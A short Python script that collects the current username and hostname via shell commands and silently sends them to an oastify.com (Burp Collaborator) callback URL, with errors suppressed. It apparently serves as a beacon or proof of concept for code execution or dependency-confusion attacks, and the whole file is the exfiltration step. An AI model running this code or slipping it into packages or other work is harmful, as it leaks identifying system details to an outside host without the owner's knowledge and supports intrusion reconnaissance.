import urllib.request
import os

user = os.popen('whoami').read().strip()
hostname = os.popen('hostname').read().strip()


webhook_url = "http://749sj4rmxwzv9jyq413nfn6bn2tuhk59.oastify.com/tu-id-unico"

final_url = f"{webhook_url}?user={user}&host={hostname}"

try:
    urllib.request.urlopen(final_url)
except:
    pass
